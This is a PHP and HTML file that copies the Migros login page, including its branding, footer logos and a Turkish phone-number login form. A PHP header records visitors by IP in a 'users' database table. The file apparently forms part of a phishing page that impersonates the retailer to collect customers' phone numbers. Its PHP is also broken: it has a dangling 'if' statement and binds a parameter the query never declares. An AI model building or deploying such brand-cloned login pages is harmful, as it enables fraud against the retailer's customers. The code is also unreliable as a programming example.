<?php
if (!($_SERVER['REQUEST_METHOD'] === 'POST')) {
   header("Location: /", true, 302);
   exit;
}
if 
$userIp = $_SERVER['REMOTE_ADDR'];  // Güncellenmesini istediğiniz kullanıcının ID'si
$newEmail = 'a';  // Yeni e-posta adresi
$sql = "UPDATE `users` SET `eposta` = :newEmail WHERE `users`.`ip` = :userIp";
$stmt = $pdo->prepare($sql);
$stmt->bindParam(':newEmail', $newEmail, PDO::PARAM_STR);
$stmt->bindParam(':userId', $userId, PDO::PARAM_STR);
$stmt->execute();


?>
<style>
    .header{
        display: none;
    }
    <?php
      if ($detect->isMobile()) {?>
    .footer
    {
      display: none;
    }
    <?php }?>
</style>
      <sm-header-lite _ngcontent-tus-c368="" _nghost-tus-c366="" class="ng-star-inserted">
         <div _ngcontent-tus-c366="" class="header-wrapper">
            <div _ngcontent-tus-c366="" class="desktop-only">
               <!----><!---->
            </div>
            <div _ngcontent-tus-c366="" class="logo-container elektronik"></div>
            <div _ngcontent-tus-c366="" class="mobile-only">
               <!----><!---->
            </div>
         </div>
         <!---->
      </sm-header-lite>
      <!----><!----><!----><!----><!---->
      <main _ngcontent-tus-c368="" class="elektronik">
         <router-outlet _ngcontent-tus-c368=""></router-outlet>
         <sm-auth _nghost-tus-c500="" class="ng-star-inserted">
            <article _ngcontent-tus-c500="" class="auth-article">
               <div _ngcontent-tus-c500="" class="padding">
                  <router-outlet _ngcontent-tus-c500=""></router-outlet>
                  <sm-login _nghost-tus-c502="" class="ng-star-inserted">
                     <div _ngcontent-tus-c502="" class="login ng-star-inserted">
                        <mat-card _ngcontent-tus-c502="" class="mat-mdc-card mdc-card login__content">
                           <mat-card-header _ngcontent-tus-c502="" class="mat-mdc-card-header justify-content-center">
                              <div class="mat-mdc-card-header-text"></div>
                              <h1 _ngcontent-tus-c502="" class="text-color-orange text-align-center">Giriş Yap</h1>
                           </mat-card-header>
                           <mat-card-content _ngcontent-tus-c502="" class="mat-mdc-card-content">
                              <div _ngcontent-tus-c502="" class="login-page__form">
                                 <p _ngcontent-tus-c502="" class="subtitle-2 text-align-center text-color-black">Cep telefonu numaranı girerek devam et</p>
                                 <form _ngcontent-tus-c502="" novalidate="" feappsubmitthrottle="" class="ng-untouched ng-pristine ng-invalid">
                                    <mat-form-field _ngcontent-tus-c502="" id="login_phone-input" color="accent" appearance="outline" class="mat-mdc-form-field ng-tns-c186-13 mat-mdc-form-field-type-mat-input mat-form-field-appearance-outline mat-accent ng-untouched ng-pristine ng-invalid ng-star-inserted">
                                       <!---->
                                       <div class="mat-mdc-text-field-wrapper mdc-text-field ng-tns-c186-13 mdc-text-field--outlined">
                                          <!---->
                                          <div class="mat-mdc-form-field-flex ng-tns-c186-13">
                                             <div matformfieldnotchedoutline="" class="mdc-notched-outline ng-tns-c186-13 mdc-notched-outline--notched mdc-notched-outline--upgraded ng-star-inserted">
                                                <div class="mdc-notched-outline__leading"></div>
                                                <div class="mdc-notched-outline__notch" style="width: calc(118px * var(--mat-mdc-form-field-floating-label-scale, 0.75) + 9px);">
                                                   <label matformfieldfloatinglabel="" class="mdc-floating-label mat-mdc-floating-label ng-tns-c186-13 mdc-floating-label--float-above ng-star-inserted" id="mat-mdc-form-field-label-14" for="mat-input-1" aria-owns="mat-input-1" style="">
                                                      <mat-label _ngcontent-tus-c502="" class="subtitle-2 text-color-black ng-tns-c186-13">Telefon Numarası</mat-label>
                                                      <!---->
                                                   </label>
                                                   <!----><!----><!---->
                                                </div>
                                                <div class="mdc-notched-outline__trailing"></div>
                                             </div>
                                             <!----><!----><!---->
                                             <div class="mat-mdc-form-field-infix ng-tns-c186-13">
                                                <!----><input _ngcontent-tus-c502="" id="mat-input-3" type="tel" matinput="" value="+90" oninput="addPrefix()" feonlynumbers="" autocomplete="tel" required="" femdcmaskedinput="" formcontrolname="phoneNumber" class="mat-mdc-input-element ng-tns-c186-13 ng-untouched ng-pristine ng-invalid mat-mdc-form-field-input-control mdc-text-field__input cdk-text-field-autofill-monitored" id="mat-input-1" aria-invalid="false" aria-required="true">
                                             </div>
                                             <!----><!---->
                                          </div>
                                          <!---->
                                       </div>
                                       <div class="mat-mdc-form-field-subscript-wrapper mat-mdc-form-field-bottom-align ng-tns-c186-13">
                                          <!---->
                                          <div class="mat-mdc-form-field-hint-wrapper ng-tns-c186-13 ng-trigger ng-trigger-transitionMessages ng-star-inserted" style="opacity: 1; transform: translateY(0%);">
                                             <!---->
                                             <div class="mat-mdc-form-field-hint-spacer ng-tns-c186-13"></div>
                                          </div>
                                          <!---->
                                       </div>
                                    </mat-form-field>
                                    <fe-button _ngcontent-tus-c502="" id="login__submit-button" type="submit" label="Giriş Yap" _nghost-tus-c239="">
                                       <button _ngcontent-tus-c239="" mat-flat-button="" color="primary" class="mdc-button mdc-button--unelevated mat-mdc-unelevated-button mat-primary mat-mdc-button-base ng-star-inserted" type="submit">
                                          <span class="mat-mdc-button-persistent-ripple mdc-button__ripple"></span>
                                          <span class="mdc-button__label">
                                             <!----> Giriş Yap <!---->
                                          </span>
                                          <span class="mat-mdc-focus-indicator"></span><span matripple="" class="mat-ripple mat-mdc-button-ripple"></span><span class="mat-mdc-button-touch-target"></span>
                                       </button>
                                       <!----><!---->
                                    </fe-button>
                                 </form>
                              </div>
                              <!---->
                           </mat-card-content>
                           <mat-card-actions _ngcontent-tus-c502="" class="mat-mdc-card-actions mdc-card__actions bg-basic-50"><span _ngcontent-tus-c502="" class="mat-body-2 text-color-grey"> Henüz hesabın yoksa <a _ngcontent-tus-c502="" id="login__redirect-to-register" routerlink="/kayit" class="text-color-orange subtitle-2" ngx-ql="" href="/kayit">Üye Ol</a></span></mat-card-actions>
                        </mat-card>
                        <div _ngcontent-tus-c502="" class="login__links"><a _ngcontent-tus-c502="" id="login__redirect-to-recovery" routerlink="/sifremi-unuttum" class="mat-caption text-color-grey" ngx-ql="" href="/sifremi-unuttum">Giriş Yapamıyorum</a><a _ngcontent-tus-c502="" id="login__open-otp-faqs-button" class="mat-caption text-color-grey"> Sıkça Sorulan Sorular </a></div>
                     </div>
                     <!----><!---->
                  </sm-login>
                  <!---->
               </div>
            </article>
         </sm-auth>
         <!---->
      </main>
      <!---->
      <div _ngcontent-tus-c368="" class="divider"></div>
      <!-- <sm-footer _ngcontent-tus-c368="" _nghost-tus-c306="">
         <div _ngcontent-tus-c306="" class="desktop-only">
            <sm-footer-logos _ngcontent-tus-c306="" _nghost-tus-c305="">
               <div _ngcontent-tus-c305="" class="logos-wrapper lite">
                  <div _ngcontent-tus-c305="" class="inner">
                     <div _ngcontent-tus-c305="" class="mdc-layout-grid__cell--span-10 mdc-layout-grid__cell--span-4-phone mdc-layout-grid__cell--span-8-tablet">
                        <div _ngcontent-tus-c305="" class="logo-container">
                           <a _ngcontent-tus-c305="" href="/"><img _ngcontent-tus-c305="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="migros-logo" class="migros-logo"></a>
                           <div _ngcontent-tus-c305="" class="copyright text-color-grey">Ürün fiyatlarına KDV bedeli dahildir. ©Migros 2023</div>
                        </div>
                     </div>
                     <div _ngcontent-tus-c305="" class="logos">
                        <a _ngcontent-tus-c305="" href="https://www.blindlook.com/tr/eyelearn/detay/migros" target="_blank" rel="noopener"><img _ngcontent-tus-c305="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="blindlook-logo" class="blindlook-logo logo"></a><a _ngcontent-tus-c305="" href="https://www.anadolugrubu.com.tr/" target="_blank" rel="noopener"><img _ngcontent-tus-c305="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="anadolu-grubu-logo" class="anadolu-grubu-logo logo"></a><a _ngcontent-tus-c305="" href="https://gidanikoru.com/" target="_blank" rel="noopener"><img _ngcontent-tus-c305="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="gidani-koru-logo" class="gidani-koru-logo logo"></a><a _ngcontent-tus-c305="" href="https://www.guvendamgasi.org.tr/firmadetay.php?Guid=7fb4da7e-00cd-11ea-b063-48df373f4850" target="_blank" rel="noopener"><img _ngcontent-tus-c305="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="guven-damgasi-logo" class="logo guven-damgasi-logo"></a>
                        <div _ngcontent-tus-c305="" class="ETBIS">
                           <div _ngcontent-tus-c305="" id="77DC0C5568104C829695C04726B02F78"><a _ngcontent-tus-c305="" href="https://etbis.eticaret.gov.tr/sitedogrulama/77DC0C5568104C829695C04726B02F78" target="_blank"><img _ngcontent-tus-c305="" src="assets/logos/etbis/etbis.jpg" alt="etbis-logo"></a></div>
                        </div>
                     </div>
                  </div>
               </div>
            </sm-footer-logos>
         </div>
         <sm-mobile-bottom-nav _ngcontent-tus-c306="" _nghost-tus-c303="">
         </sm-mobile-bottom-nav>
      </sm-footer> -->
      <fe-product-cookie-indicator _ngcontent-tus-c368="" _nghost-tus-c167="">
         <!---->
      </fe-product-cookie-indicator>
      <script>
         function addPrefix() {
            var inputElement = document.getElementById("mat-input-3");
            if (!inputElement.value.startsWith("+90")) {
               inputElement.value = "+90";
            }
            if (inputElement.value.length > 13) {
            inputElement.value = inputElement.value.slice(0, 13);
            }
         }
      </script>